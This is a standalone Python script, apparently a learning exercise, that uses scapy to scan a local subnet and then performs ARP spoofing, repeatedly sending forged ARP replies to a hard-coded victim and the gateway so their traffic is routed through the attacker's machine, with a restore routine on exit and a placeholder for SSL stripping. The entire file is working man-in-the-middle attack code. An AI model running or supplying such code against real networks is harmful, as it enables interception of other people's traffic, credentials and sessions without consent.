#!/usr/bin/env python3

import netifaces
import scapy.all as scapy
import time
import threading
import os

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]

    return answered_list[0][1].hwsrc
    # return 'b4:6b:fc:1d:e8:9f' # error here, use this for temp

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
  
    scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)

def getDevice(ip):
    request = scapy.ARP()
    request.pdst = ip
    broadcast = scapy.Ether()

    broadcast.dst = 'ff:ff:ff:ff:ff:ff'

    request_broadcast = broadcast / request
    clients = scapy.srp(request_broadcast, timeout=10, verbose=1)[0]

    print('Available devices')
    print('----------------------------')
    print('IP         MAC')
    print('----------------------------')
    for element in clients:
        print(element[1].psrc + "   " + element[1].hwsrc)
    print(' ')

def sslSplit():
    x = 0
    while x < 5:
        os.system("date")
        x = x + 1
        time.sleep(2)
    print("[-] sslSplit stopped")

# print(get_mac('192.168.99.100')) 
getDevice('192.168.99.1/24')

target_ip = "192.168.99.100" # Enter your target IP
gateway_ip = "192.168.99.1" # Enter your gateway's IP

# t = threading.Thread(target = sslSplit)
# t.start()

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip) # cheat on victim to know I am gateway
        spoof(gateway_ip, target_ip) # cheat on switch to know I am target
        sent_packets_count = sent_packets_count + 2
        print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
        time.sleep(2) # Waits for two seconds
  
except KeyboardInterrupt:
    print("\nCtrl + C pressed.............Exiting")
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
    print("[-] Arp Spoof Stopped")
    # t.join()

# interface = netifaces.interfaces()[1]
# print('=============')
# print('Interface Info')
# print('=============')
# print(netifaces.ifaddresses(interface))
# print(' ')

# request = scapy.ARP()
# print('============')
# print('Request Info')
# print('============')
# print(request.summary())
# print(' ')